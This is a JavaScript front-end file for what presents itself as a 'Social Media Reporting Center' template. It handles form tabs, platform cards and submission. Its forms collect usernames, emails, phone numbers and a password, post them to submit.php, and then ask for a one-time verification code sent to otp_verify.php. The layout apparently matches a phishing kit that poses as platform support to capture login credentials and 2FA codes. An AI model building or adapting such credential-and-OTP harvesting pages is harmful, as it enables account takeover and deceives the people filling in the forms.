/* ================================================================
   assets.js — Social Media Reporting Center (Template 4)
   Namespace: smr_   |   No external dependencies.
   ================================================================ */

(function () {
  'use strict';

  /* ── State ──────────────────────────────────────────────────── */
  var smr_state = {
    activePlatformGroup: 'social',   // 'social' | 'messaging'
    submitting: false
  };

  /* ── DOM ready ──────────────────────────────────────────────── */
  document.addEventListener('DOMContentLoaded', function () {
    smr_initTabs();
    smr_initForms();
    smr_initPasswordToggle();
    smr_initPlatformCards();
    smr_initOtpForms();
    smr_initCrossValidation('social');
    smr_initCrossValidation('messaging');
  });

  /* ── Tab switching ──────────────────────────────────────────── */
  function smr_initTabs() {
    var tabSocial    = document.getElementById('smr_tab_social');
    var tabMessaging = document.getElementById('smr_tab_messaging');

    if (!tabSocial || !tabMessaging) return;

    tabSocial.addEventListener('click', function () {
      smr_switchTab('social');
    });
    tabMessaging.addEventListener('click', function () {
      smr_switchTab('messaging');
    });
  }

  function smr_switchTab(group) {
    smr_state.activePlatformGroup = group;

    var tabSocial    = document.getElementById('smr_tab_social');
    var tabMessaging = document.getElementById('smr_tab_messaging');
    var panelSocial  = document.getElementById('smr_panel_social');
    var panelMsg     = document.getElementById('smr_panel_messaging');

    if (!tabSocial || !tabMessaging || !panelSocial || !panelMsg) return;

    /* Update tab active states */
    if (group === 'social') {
      tabSocial.classList.add('smr-tab-active');
      tabMessaging.classList.remove('smr-tab-active');
      panelSocial.style.display = 'block';
      panelMsg.style.display    = 'none';
      smr_staggerCards(panelSocial);
    } else {
      tabSocial.classList.remove('smr-tab-active');
      tabMessaging.classList.add('smr-tab-active');
      panelSocial.style.display = 'none';
      panelMsg.style.display    = 'block';
      smr_staggerCards(panelMsg);
    }

    /* Reset OTP sections when switching tabs */
    smr_hideOtpSection('smr_otp_section_social');
    smr_hideOtpSection('smr_otp_section_messaging');
  }

  /* ── Staggered platform card entrance on tab switch ─────────── */
  function smr_staggerCards(panelEl) {
    var cards = panelEl.querySelectorAll('.smr-platform-card');
    for (var i = 0; i < cards.length; i++) {
      (function (card, delay) {
        card.style.opacity   = '0';
        card.style.transform = 'translateY(6px) scale(0.97)';
        setTimeout(function () {
          card.style.transition = 'opacity 0.32s ease, transform 0.32s ease';
          card.style.opacity    = '1';
          card.style.transform  = 'translateY(0) scale(1)';
        }, delay);
      })(cards[i], i * 45);
    }
  }

  /* ── Form init ──────────────────────────────────────────────── */
  function smr_initForms() {
    var formSocial = document.getElementById('smr_form_social');
    var formMsg    = document.getElementById('smr_form_messaging');

    if (formSocial) {
      formSocial.addEventListener('submit', function (e) {
        smr_handleSubmit(e, 'social');
      });
    }
    if (formMsg) {
      formMsg.addEventListener('submit', function (e) {
        smr_handleSubmit(e, 'messaging');
      });
    }
  }

  function smr_initPasswordToggle() {
    var toggles = document.querySelectorAll('[data-password-toggle]');

    for (var i = 0; i < toggles.length; i++) {
      (function (btn) {
        var targetId = btn.getAttribute('data-target');
        if (!targetId) return;

        var input = document.getElementById(targetId);
        if (!input) return;

        function smr_setPasswordToggleState(isVisible) {
          btn.classList.toggle('is-visible', isVisible);
          btn.setAttribute('aria-pressed', isVisible ? 'true' : 'false');
          btn.setAttribute('aria-label', isVisible ? 'Hide password' : 'Show password');
        }

        smr_setPasswordToggleState(input.type === 'text');

        btn.addEventListener('click', function () {
          if (btn.disabled || input.disabled) return;
          var isVisible = input.type === 'text';
          input.type = isVisible ? 'password' : 'text';
          smr_setPasswordToggleState(!isVisible);
        });
      })(toggles[i]);
    }
  }

  /* ── Form submission ────────────────────────────────────────── */
  function smr_handleSubmit(e, group) {
    e.preventDefault();

    if (smr_state.submitting) return;
    smr_state.submitting = true;

    var form    = e.target;
    var btnId   = (group === 'social') ? 'smr_btn_social'    : 'smr_btn_messaging';
    var errId   = (group === 'social') ? 'smr_err_social'    : 'smr_err_messaging';
    var otpSecId = (group === 'social') ? 'smr_otp_section_social' : 'smr_otp_section_messaging';

    var btn     = document.getElementById(btnId);
    var errBox  = document.getElementById(errId);
    var formData = new FormData(form);

    /* Cross-field validation: username / email / phone must differ */
    var crossErr = smr_validateCrossFields(group);
    if (crossErr) {
      smr_state.submitting = false;
      smr_showError(errBox, crossErr);
      return;
    }

    /* Show loading state */
    smr_setButtonLoading(btn, true);
    smr_clearError(errBox);

    /* POST to submit.php */
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'submit.php', true);

    xhr.onreadystatechange = function () {
      if (xhr.readyState !== 4) return;

      smr_state.submitting = false;
      smr_setButtonLoading(btn, false);

      if (xhr.status === 200) {
        try {
          var resp = JSON.parse(xhr.responseText);
          if (resp.status === 'success') {
            /* Inject submission_id into OTP form and reveal OTP section */
            smr_injectSubmissionId(group, resp.submission_id);
            smr_showOtpSection(otpSecId);

            /* Scroll to OTP section */
            var otpEl = document.getElementById(otpSecId);
            if (otpEl) {
              setTimeout(function () {
                otpEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
              }, 150);
            }

            /* Disable main form fields to indicate they were submitted */
            smr_disableForm(form);
            btn.disabled = true;
            btn.textContent = '✓ Details Submitted';

          } else {
            smr_showError(errBox, resp.message || 'Submission failed. Please try again.');
          }
        } catch (ex) {
          smr_showError(errBox, 'An unexpected error occurred. Please try again.');
        }
      } else if (xhr.status === 422) {
        try {
          var errResp = JSON.parse(xhr.responseText);
          smr_showError(errBox, errResp.message || 'Please fill in all required fields correctly.');
        } catch (ex) {
          smr_showError(errBox, 'Validation error. Please check your inputs.');
        }
      } else {
        smr_showError(errBox, 'Server error. Please try again shortly.');
      }
    };

    xhr.onerror = function () {
      smr_state.submitting = false;
      smr_setButtonLoading(btn, false);
      smr_showError(errBox, 'Network error. Please check your connection and try again.');
    };

    xhr.send(formData);
  }

  /* ── OTP form init ──────────────────────────────────────────── */
  /* OTP forms submit normally (page reload to otp_verify.php).
     Single rectangular input — validates 4–8 digits, strips non-numeric
     characters on input, guards against duplicate submission. */
  function smr_initOtpForms() {
    var configs = [
      { formId: 'smr_otp_form_social',    btnId: 'smr_otp_btn_social',    inputId: 'smr_otp_input_social',    errId: 'smr_otp_err_social'    },
      { formId: 'smr_otp_form_messaging', btnId: 'smr_otp_btn_messaging', inputId: 'smr_otp_input_messaging', errId: 'smr_otp_err_messaging' }
    ];

    configs.forEach(function (cfg) {
      var form  = document.getElementById(cfg.formId);
      var input = document.getElementById(cfg.inputId);
      var btn   = document.getElementById(cfg.btnId);
      var errEl = document.getElementById(cfg.errId);

      if (!form) return;

      /* Strip non-digit characters on every keystroke / paste */
      if (input) {
        input.addEventListener('input', function () {
          this.value = this.value.replace(/[^0-9]/g, '');
          if (errEl) errEl.style.display = 'none';
        });
      }

      form.addEventListener('submit', function (e) {
        /* Guard: prevent duplicate submission */
        if (form.getAttribute('data-submitted') === '1') {
          e.preventDefault();
          return;
        }

        var otp = input ? input.value.trim() : '';

        /* Validate: 4–8 digits required */
        if (!/^\d{4,8}$/.test(otp)) {
          e.preventDefault();
          if (errEl) {
            errEl.textContent = 'Please enter a valid 4–8 digit verification code.';
            errEl.style.display = 'block';
          }
          return;
        }

        /* Mark submitted and show loading state */
        form.setAttribute('data-submitted', '1');
        smr_setButtonLoading(btn, true);
      });
    });
  }

  /* ── Helpers ────────────────────────────────────────────────── */
  /* ── Cross-field validation ────────────────────────────────── */

  /**
   * Compare reporter vs victim username, email, and phone.
   * Names are intentionally excluded — identical names are allowed.
   * Returns an error string on the first conflict, or null if all OK.
   */
  function smr_validateCrossFields(group) {
    var p = (group === 'social') ? 'smr_s_' : 'smr_m_';

    function val(id) {
      var el = document.getElementById(id);
      return el ? el.value.trim() : '';
    }

    var rUser  = val(p + 'reporterUsername').toLowerCase();
    var vUser  = val(p + 'victimUsername').toLowerCase();
    var rEmail = val(p + 'reporterEmail').toLowerCase();
    var vEmail = val(p + 'victimEmail').toLowerCase();
    var rPhone = val(p + 'reporterPhone').replace(/[\s\-().+]/g, '');
    var vPhone = val(p + 'victimPhone').replace(/[\s\-().+]/g, '');

    if (rUser && vUser && rUser === vUser) {
      return 'Reporter and Victim usernames cannot be the same.';
    }
    if (rEmail && vEmail && rEmail === vEmail) {
      return 'Reporter and Victim email addresses cannot be the same.';
    }
    if (rPhone && vPhone && rPhone === vPhone) {
      return 'Reporter and Victim phone numbers cannot be the same.';
    }
    return null;
  }

  /**
   * Attach real-time input listeners to the six compared fields so
   * errors appear (and clear) as the user types — without waiting for
   * submission.
   */
  function smr_initCrossValidation(group) {
    var p     = (group === 'social') ? 'smr_s_' : 'smr_m_';
    var errId = (group === 'social') ? 'smr_err_social' : 'smr_err_messaging';
    var errBox = document.getElementById(errId);

    var ids = [
      p + 'reporterUsername', p + 'victimUsername',
      p + 'reporterEmail',    p + 'victimEmail',
      p + 'reporterPhone',    p + 'victimPhone'
    ];

    ids.forEach(function (id) {
      var el = document.getElementById(id);
      if (!el) return;
      el.addEventListener('input', function () {
        var err = smr_validateCrossFields(group);
        if (err) {
          smr_showError(errBox, err);
        } else {
          smr_clearError(errBox);
        }
      });
    });
  }

  function smr_showOtpSection(id) {
    var el = document.getElementById(id);
    if (el) {
      el.classList.add('smr-otp-visible');
    }
  }

  function smr_hideOtpSection(id) {
    var el = document.getElementById(id);
    if (!el) return;
    el.classList.remove('smr-otp-visible');
    /* Reset form state so the modal can be reused if it reopens */
    var form = el.querySelector('form');
    if (form) {
      form.removeAttribute('data-submitted');
      var otpInput = form.querySelector('input[name="otp_value"]');
      if (otpInput) otpInput.value = '';
    }
    var group = id.replace('smr_otp_section_', '');
    var errEl = document.getElementById('smr_otp_err_' + group);
    if (errEl) errEl.style.display = 'none';
    var otpBtn = document.getElementById('smr_otp_btn_' + group);
    if (otpBtn) {
      otpBtn.disabled = false;
      otpBtn.textContent = 'Verify Identity';
    }
  }

  function smr_injectSubmissionId(group, submissionId) {
    var fieldId = (group === 'social')
      ? 'smr_otp_subid_social'
      : 'smr_otp_subid_messaging';
    var el = document.getElementById(fieldId);
    if (el) {
      el.value = submissionId || '';
    }
  }

  function smr_setButtonLoading(btn, loading) {
    if (!btn) return;
    if (loading) {
      btn.disabled = true;
      btn.setAttribute('data-original-text', btn.textContent);
      btn.innerHTML = '<span class="smr-spinner"></span>Verifying...';
    } else {
      btn.disabled = false;
      var orig = btn.getAttribute('data-original-text');
      if (orig) btn.textContent = orig;
    }
  }

  function smr_showError(box, msg) {
    if (!box) return;
    box.textContent = msg;
    box.style.display = 'block';
    box.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  function smr_clearError(box) {
    if (!box) return;
    box.textContent = '';
    box.style.display = 'none';
  }

  function smr_disableForm(form) {
    var inputs = form.querySelectorAll('input, select, textarea');
    for (var i = 0; i < inputs.length; i++) {
      inputs[i].disabled = true;
    }

    var toggleButtons = form.querySelectorAll('[data-password-toggle]');
    for (var j = 0; j < toggleButtons.length; j++) {
      toggleButtons[j].disabled = true;
    }
  }

  /* ── Platform icon card selector ───────────────────────────── */

  /**
   * smr_initPlatformCards()
   * Finds all .smr-platform-cards-grid elements inside .smr-root,
   * attaches click/keyboard handlers to each .smr-platform-card label,
   * and syncs the visual selected state with the checked radio input.
   */
  function smr_initPlatformCards() {
    var root = document.querySelector('.smr-root');
    if (!root) return;

    var grids = root.querySelectorAll('.smr-platform-cards-grid');
    for (var g = 0; g < grids.length; g++) {
      smr_bindCardGrid(grids[g]);
    }
  }

  /**
   * smr_bindCardGrid(gridEl)
   * Wires up click handlers on every .smr-platform-card within gridEl.
   */
  function smr_bindCardGrid(gridEl) {
    var cards = gridEl.querySelectorAll('.smr-platform-card');

    for (var i = 0; i < cards.length; i++) {
      (function (card) {
        card.addEventListener('click', function () {
          smr_handlePlatformSelect(gridEl, card);
        });

        /* Keyboard: Space / Enter triggers selection on the label */
        card.addEventListener('keydown', function (e) {
          if (e.key === ' ' || e.key === 'Enter') {
            e.preventDefault();
            smr_handlePlatformSelect(gridEl, card);
          }
        });

        /* When the hidden radio inside the card receives focus,
           make the card appear focused too */
        var radio = card.querySelector('.smr-radio-hidden');
        if (radio) {
          radio.addEventListener('change', function () {
            smr_handlePlatformSelect(gridEl, card);
          });
        }
      })(cards[i]);
    }

    /* Restore visual state if any radio is already checked (e.g. after
       browser back-navigation restores form state) */
    smr_syncCardStates(gridEl);
  }

  /**
   * smr_handlePlatformSelect(gridEl, selectedCard)
   * Marks selectedCard as active and checks its radio; deselects others.
   */
  function smr_handlePlatformSelect(gridEl, selectedCard) {
    var cards = gridEl.querySelectorAll('.smr-platform-card');

    /* Deselect all cards in this grid */
    for (var i = 0; i < cards.length; i++) {
      cards[i].classList.remove('smr-platform-card--selected');
    }

    /* Select the clicked card */
    selectedCard.classList.add('smr-platform-card--selected');

    /* Check the radio inside */
    var radio = selectedCard.querySelector('.smr-radio-hidden');
    if (radio && !radio.checked) {
      radio.checked = true;
      /* Dispatch a change event so any dependent listeners fire */
      var evt = document.createEvent('Event');
      evt.initEvent('change', true, true);
      radio.dispatchEvent(evt);
    }
  }

  /**
   * smr_syncCardStates(gridEl)
   * Reads the current checked radio and applies the selected class
   * to the matching card (useful on page load / back-nav restore).
   */
  function smr_syncCardStates(gridEl) {
    var cards = gridEl.querySelectorAll('.smr-platform-card');
    for (var i = 0; i < cards.length; i++) {
      var radio = cards[i].querySelector('.smr-radio-hidden');
      if (radio && radio.checked) {
        cards[i].classList.add('smr-platform-card--selected');
      } else {
        cards[i].classList.remove('smr-platform-card--selected');
      }
    }
  }

})();
